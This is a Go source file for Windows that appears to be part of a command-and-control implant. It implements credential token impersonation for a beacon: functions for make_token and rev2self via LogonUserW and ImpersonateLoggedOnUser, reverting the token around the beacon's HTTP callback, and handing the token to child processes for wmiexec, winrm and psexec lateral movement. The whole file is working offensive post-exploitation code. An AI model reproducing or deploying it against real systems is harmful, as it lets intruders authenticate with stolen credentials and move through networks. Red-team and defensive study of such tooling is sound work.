//go:build windows

package main

import (
	"fmt"
	"os/exec"
	"runtime"
	"sync"
	"syscall"
	"unsafe"
)

// LOGON32_LOGON_NEW_CREDENTIALS clones the caller's token and attaches the
// supplied credentials to outbound network authentication only: callers keep
// the agent's local identity but authenticate on the network as the alternate
// user, exactly like runas /netonly. The token type is 9 (new credentials);
// ImpersonateLoggedOnUser sets it on the calling OS thread so that subsequent
// network operations (SMB, SCM, COM, WSMan) on that thread use those creds
// without requiring SE_ASSIGNPRIMARYTOKEN_PRIVILEGE.
const (
	logonNewCredentials  = 9
	logonProviderWinNT32 = 3
)

var (
	advapi32                    = syscall.NewLazyDLL("advapi32.dll")
	procLogonUserW              = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = advapi32.NewProc("RevertToSelf")

	tokenMu        sync.Mutex
	activeToken    syscall.Token // token handle; kept alive through rev2self for reestablishment
	storedIdentity string        // persists through rev2self; used to restore tokenIdentity
	tokenIdentity  string        // non-empty only when actively impersonating
	tokenActive    bool          // true when ImpersonateLoggedOnUser has been called
)

// makeTokenAction creates a netonly-style token and immediately impersonates
// it on the calling goroutine's OS thread (which must be locked by the
// caller). LogonUser does not validate the credentials against a domain
// controller for this logon type, so success only proves that the token was
// created, not that the password is correct. Stored credentials are never
// logged or echoed; the token handle survives rev2self so the caller can
// reestablish the impersonation after a child-process creation that may have
// reverted it.
func makeTokenAction(domain, user, password string) (string, error) {
	userPtr, err := syscall.UTF16PtrFromString(user)
	if err != nil {
		return "", fmt.Errorf("encode user: %w", err)
	}
	domainPtr, err := syscall.UTF16PtrFromString(domain)
	if err != nil {
		return "", fmt.Errorf("encode domain: %w", err)
	}
	passwordPtr, err := syscall.UTF16PtrFromString(password)
	if err != nil {
		return "", fmt.Errorf("encode password: %w", err)
	}
	var handle syscall.Handle
	result, _, callErr := procLogonUserW.Call(
		uintptr(unsafe.Pointer(userPtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(logonNewCredentials),
		uintptr(logonProviderWinNT32),
		uintptr(unsafe.Pointer(&handle)),
	)
	if result == 0 {
		return "", fmt.Errorf("LogonUserW failed: %w", callErr)
	}
	identity := user
	if domain != "" {
		identity = domain + `\` + user
	}
	// Lock this goroutine to its OS thread so the thread token survives
	// goroutine rescheduling. The lock is held until rev2self releases it.
	runtime.LockOSThread()
	if r, _, impErr := procImpersonateLoggedOnUser.Call(uintptr(handle)); r == 0 {
		runtime.UnlockOSThread()
		_ = syscall.CloseHandle(handle)
		return "", fmt.Errorf("ImpersonateLoggedOnUser failed: %w", impErr)
	}
	tokenMu.Lock()
	previousToken := activeToken
	previousIdentity := storedIdentity
	activeToken = syscall.Token(handle)
	tokenIdentity = identity
	storedIdentity = identity
	tokenActive = true
	tokenMu.Unlock()
	if previousToken != 0 {
		_ = previousToken.Close()
		return fmt.Sprintf(
			"token replaced: %s (was: %s); network operations on this thread use this identity",
			identity, previousIdentity,
		), nil
	}
	return fmt.Sprintf(
		"token created: %s; network operations on this thread use this identity",
		identity,
	), nil
}

// rev2selfAction reverts thread impersonation and releases the OS-thread lock
// so the goroutine scheduler can migrate the goroutine. The token handle is
// kept alive so reestablishThreadToken can re-impersonate without LogonUserW.
// storedIdentity is preserved for reestablishment display.
func rev2selfAction() (string, error) {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if activeToken == 0 {
		return "no token active", nil
	}
	if !tokenActive {
		return fmt.Sprintf(
			"token already reverted (%s retained; call reestablish to restore)",
			storedIdentity,
		), nil
	}
	procRevertToSelf.Call()
	runtime.UnlockOSThread()
	identity := tokenIdentity
	tokenIdentity = ""
	tokenActive = false
	// activeToken handle is kept alive; storedIdentity is kept for reestablishment.
	return fmt.Sprintf(
		"token reverted: %s (handle retained; reestablishThreadToken restores impersonation)",
		identity,
	), nil
}

// temporarilyRevertForCallback reverts thread impersonation and releases the
// OS-thread lock before the beacon makes its HTTP callback so the outbound
// connection is never made under the operator network identity. This matters
// even for plain HTTP because Windows may negotiate NTLM on behalf of the
// goroutine's OS thread when going through an authenticating proxy.
// The token handle is kept alive; call reestablishThreadToken after the
// callback to restore impersonation. Lock count stays balanced: one Unlock
// here is matched by one LockOSThread in reestablishThreadToken.
func temporarilyRevertForCallback() {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if activeToken == 0 || !tokenActive {
		return
	}
	procRevertToSelf.Call()
	runtime.UnlockOSThread()
	tokenActive = false
	// tokenIdentity is cleared; storedIdentity is preserved for restoration.
	tokenIdentity = ""
}

// reestablishThreadToken re-impersonates using the retained token handle on
// the calling goroutine's OS thread. It is a no-op when no token was set.
// Call this after any child-process creation that may have internally called
// RevertToSelf on the creating thread (CreateProcessAsUserW behavior).
func reestablishThreadToken() {
	tokenMu.Lock()
	token := activeToken
	identity := storedIdentity
	alreadyActive := tokenActive
	tokenMu.Unlock()
	if token == 0 || alreadyActive {
		return
	}
	runtime.LockOSThread()
	if r, _, _ := procImpersonateLoggedOnUser.Call(uintptr(token)); r == 0 {
		runtime.UnlockOSThread()
		return
	}
	tokenMu.Lock()
	tokenIdentity = identity
	tokenActive = true
	tokenMu.Unlock()
}

// applyCommandToken gives an operator command child the active network
// identity via SysProcAttr.Token (CreateProcessAsUserW / CreateProcessWithTokenW).
// This path is used for wmiexec and winrm child processes; psexec uses
// reestablishThreadToken on its goroutine's thread instead (no privilege
// requirement). After a call that uses SysProcAttr.Token, call
// reestablishThreadToken to restore the creating goroutine's thread token.
func applyCommandToken(command *exec.Cmd) {
	if command.SysProcAttr == nil {
		return
	}
	tokenMu.Lock()
	defer tokenMu.Unlock()
	if tokenActive && activeToken != 0 {
		command.SysProcAttr.Token = activeToken
	}
}

// processUserIdentity resolves the account running this agent process,
// falling back to the environment when the token lookup fails.
func processUserIdentity() string {
	if token, err := syscall.OpenCurrentProcessToken(); err == nil {
		defer token.Close()
		if user, err := token.GetTokenUser(); err == nil {
			if account, domain, _, err := user.User.Sid.LookupAccount(""); err == nil && account != "" {
				if domain != "" {
					return domain + `\` + account
				}
				return account
			}
		}
	}
	return username()
}

// activeNetworkIdentity returns the make_token identity, if one is active.
func activeNetworkIdentity() string {
	tokenMu.Lock()
	defer tokenMu.Unlock()
	return tokenIdentity
}
